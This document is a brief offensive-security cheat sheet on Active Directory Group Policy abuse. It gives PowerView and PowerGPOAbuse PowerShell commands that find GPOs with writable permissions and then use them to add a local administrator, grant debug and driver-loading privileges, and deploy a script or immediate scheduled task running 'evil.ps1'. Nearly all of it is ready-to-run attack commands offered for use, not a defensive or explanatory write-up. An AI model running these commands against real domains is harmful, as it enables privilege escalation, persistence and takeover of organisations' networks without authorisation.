# Note:
*if connecting from a windows host:*
1. set DNS to the domain controller's IP
2. start a `runas.exe /netonly /user:<DOMAIN_FQDN>\<USERNAME> powershell.exe`
3. add `-domain` flag to every powershell module you use

# Find vulerable GPOs using PowerView [Github Raw](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)
```powershell
Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
```

# Abuse GPO with PowerGPOAbuse [Github](https://github.com/rootSySdk/PowerGPOAbuse)
# Adding a localadmin 
```powershell
Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'
```
# Assign a new right (not test --> might break stuff)
```powershell
Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'
```
# Adding a New Computer/User script (not tested)
```powershell
Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'
```
# Create an immediate task (not that reliable)
```powershell
Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'
```